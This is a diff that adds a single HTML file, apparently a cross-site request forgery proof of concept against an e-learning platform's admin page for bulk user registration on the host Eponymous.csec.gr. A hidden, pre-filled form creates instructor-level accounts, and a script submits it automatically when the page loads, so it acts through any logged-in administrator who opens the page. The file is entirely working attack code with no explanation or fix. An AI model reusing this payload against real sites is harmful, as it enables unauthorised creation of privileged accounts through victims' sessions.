@@ -1,0 +1,50 @@
+<form id='csrf_form' action='http://Eponymous.csec.gr/modules/admin/multireguser.php' method='post'>
+<table class='FormData'>
+<tr><th>Ορισμός πεδίων</th>
+    <td><input type='text' name='fields' size='50' value='first last id email phone' /></td>
+<tr><th>Στοιχεία χρηστών</th>
+    <td><input type='text' name='user_info'
+    value='mult mult 100 xss@xss.gr 123' rows='10' cols='60'></textarea></td>
+</tr>
+<tr><th>Δημιουργία λογαριασμών</th>
+    <td><select name='type'>
+        <option value='stud'>εκπαιδευόμενων</option>
+        <option selected value='prof'>Εκπαιδευτών</option></select></td>
+</tr>
+<tr><th>Πρόθεμα username χρηστών</th>
+    <td><input type='text' name='prefix' size='10' value='user' /></td>
+</tr>
+<tr><th>Σχολή / Τμήμα</th>
+    <td>
+<select name='facid'  class='auth_input'>
+<option selected value='1'>Τμήμα 1</option>
+<option value='2'>Τμήμα 2</option>
+<option value='4'>Τμήμα 4</option>
+</select>
+</td>
+</tr>
+<tr><th>Αριθμός μητρώου</th>
+    <td><input type='text' name='am' value='123' size='10' /></td>
+</tr>
+<tr><th>Γλώσσα</th>
+    <td>
+<select name='lang'  class='auth_input'>
+<option selected value='el'>Ελληνικά</option>
+<option value='en'>English</option>
+<option value='es'>Español</option>
+</select>
+</td>
+</tr>
+<tr><th>Ενημερωτικό email</th>
+    <td><input name='send_mail' type='checkbox' />
+        Αποστολή των στοιχείων των χρηστών μέσω e-mail</td>
+</tr>
+<tr><th>&nbsp;</th>
+    <td><input class='FormData_InputText' type='text' name='submit' value='submit'></td>
+</tr>
+</table>
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
